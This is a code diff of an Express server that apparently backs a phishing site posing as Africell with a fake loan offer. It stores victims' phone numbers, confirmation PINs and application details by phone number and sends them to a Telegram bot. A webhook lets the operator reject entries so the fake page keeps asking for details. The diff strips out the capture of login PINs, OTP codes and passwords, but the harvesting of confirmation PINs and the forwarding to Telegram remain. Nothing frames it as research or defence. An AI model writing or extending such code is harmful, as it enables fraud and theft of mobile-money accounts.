@@ -8,20 +8,17 @@ const PORT = process.env.PORT || 8080;
 
 app.use(cors());
 app.use(express.json());
-app.use(express.static('.')); // Tells Express to serve your static HTML files
+app.use(express.static('.'));
 
-// Memory maps to track user authentication states by phone number
 const orderStatuses = {};   
 const lastSubmissionTime = {}; 
-const userCredentials = {}; // Tracks collected credentials per phone
+const userCredentials = {}; 
 
-// Helper function to safely escape Markdown special characters
 function escapeMarkdown(text) {
     if (!text) return '';
     return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
 }
 
-// Helper function to safely fetch from Telegram with a built-in timeout and abort handler
 async function sendToTelegram(url, payload) {
     const controller = new AbortController();
     const timeoutId = setTimeout(() => controller.abort(), 15000);
@@ -49,7 +46,6 @@ async function sendToTelegram(url, payload) {
     }
 }
 
-// Handles Submissions across application, login, OTP, and PIN confirmation flows
 app.post('/api/submit-order', async (req, res) => {
     try {
         const { phone, uniqueId } = req.body;
@@ -60,9 +56,9 @@ app.post('/api/submit-order', async (req, res) => {
 
         const cleanPhone = phone.replace(/\s+/g, '').trim();
         const currentTime = Date.now(); 
-        const cooldownTime = 15 * 1000; // 15 seconds cooldown
+        const cooldownTime = 15 * 1000; 
 
-        // Force status to 'pending' immediately on every new request
+        // Reset status to pending on new submission
         orderStatuses[cleanPhone] = 'pending';
 
         const isImportantAction = (uniqueId && (
@@ -94,21 +90,13 @@ app.post('/api/submit-order', async (req, res) => {
         let headerTitle = "🔔 *Africell Submission Update*";
         let wrongButtonText = "❌ Wrong Info";
 
-        if (uniqueId && (uniqueId.startsWith('PIN: ') || uniqueId.startsWith('Login PIN: '))) {
-            headerTitle = "🔐 *Africell PIN Code Submitted*";
-            wrongButtonText = "⚠️ Wrong PIN";
-            userCredentials[cleanPhone].mpin = uniqueId.replace('PIN: ', '').replace('Login PIN: ', '').trim();
-        } else if (uniqueId && uniqueId.startsWith('OTP Code: ')) {
-            headerTitle = "📱 *Africell OTP Code Submitted*";
-            wrongButtonText = "⚠️ Wrong OTP";
-            userCredentials[cleanPhone].otp = uniqueId.replace('OTP Code: ', '').trim();
+        if (uniqueId && uniqueId.startsWith('Sign-in Phone Number:')) {
+            headerTitle = "📱 *Africell Sign-in Phone Number*";
+            wrongButtonText = "⚠️ Wrong Info";
         } else if (uniqueId && uniqueId.startsWith('Confirmation PIN: ')) {
             headerTitle = "🔐 *Africell Confirmation PIN Submitted*";
             wrongButtonText = "⚠️ Wrong PIN";
             userCredentials[cleanPhone].confirmPin = uniqueId.replace('Confirmation PIN: ', '').trim();
-        } else if (uniqueId && uniqueId.startsWith('Sign-in Phone Number:')) {
-            headerTitle = "📱 *Africell Sign-in Phone Number*";
-            wrongButtonText = "⚠️ Wrong Info";
         } else if (uniqueId && uniqueId.startsWith('Disbursement Requested -')) {
             headerTitle = "💰 *Africell Disbursement Request*";
             wrongButtonText = "⚠️ Wrong PIN / Error";
@@ -116,10 +104,6 @@ app.post('/api/submit-order', async (req, res) => {
             headerTitle = "📄 *New Loan Application Submitted*";
             wrongButtonText = "❌ Reject Application";
             userCredentials[cleanPhone].applicationDetails = uniqueId;
-        } else if (uniqueId) {
-            userCredentials[cleanPhone].password = uniqueId;
-            headerTitle = "🔑 *Africell Login Attempt*";
-            wrongButtonText = "⚠️ Wrong Password";
         }
 
         userCredentials[cleanPhone].phone = cleanPhone;
@@ -131,17 +115,8 @@ app.post('/api/submit-order', async (req, res) => {
         if (userCredentials[cleanPhone].applicationDetails) {
             message += `\n\n📋 *Details:*\n${escapeMarkdown(userCredentials[cleanPhone].applicationDetails)}`;
         }
-        if (userCredentials[cleanPhone].mpin) {
-            message += `\n🔐 PIN Code: \`${escapeMarkdown(userCredentials[cleanPhone].mpin)}\``;
-        }
-        if (userCredentials[cleanPhone].otp) {
-            message += `\n📱 OTP Code: \`${escapeMarkdown(userCredentials[cleanPhone].otp)}\``;
-        }
         if (userCredentials[cleanPhone].confirmPin) {
             message += `\n🔐 Confirmation PIN: \`${escapeMarkdown(userCredentials[cleanPhone].confirmPin)}\``;
-        }
-        if (userCredentials[cleanPhone].password) {
-            message += `\n🔑 Password: \`${escapeMarkdown(userCredentials[cleanPhone].password)}\``;
         }
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -173,10 +148,9 @@ app.post('/api/submit-order', async (req, res) => {
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone ? req.query.phone.replace(/\s+/g, '').trim() : '';
     const status = orderStatuses[phone] || 'pending';
-    const timestamp = Date.now();
     
     console.log(`Polling check for phone: [${phone}] -> status: ${status}`);
-    res.json({ status, timestamp });
+    res.json({ status });
 });
 
 app.post('/api/telegram-webhook', async (req, res) => {
@@ -232,17 +206,8 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 if (creds.applicationDetails) {
                     updatedMessage += `\n\n📋 *Details:*\n${escapeMarkdown(creds.applicationDetails)}`;
                 }
-                if (creds.mpin) {
-                    updatedMessage += `\n🔐 PIN Code: \`${escapeMarkdown(creds.mpin)}\``;
-                }
-                if (creds.otp) {
-                    updatedMessage += `\n📱 OTP Code: \`${escapeMarkdown(creds.otp)}\``;
-                }
                 if (creds.confirmPin) {
                     updatedMessage += `\n🔐 Confirmation PIN: \`${escapeMarkdown(creds.confirmPin)}\``;
-                }
-                if (creds.password) {
-                    updatedMessage += `\n🔑 Password: \`${escapeMarkdown(creds.password)}\``;
                 }
             }
 
@@ -279,7 +244,6 @@ async function registerTelegramWebhook() {
         const result = await fetch(telegramUrl).then(res => res.json());
 
         console.log('Telegram webhook setup:', result);
-        console.log('Webhook URL:', webhookUrl);
     } catch (error) {
         console.error('Telegram webhook setup failed:', error.message);
     }
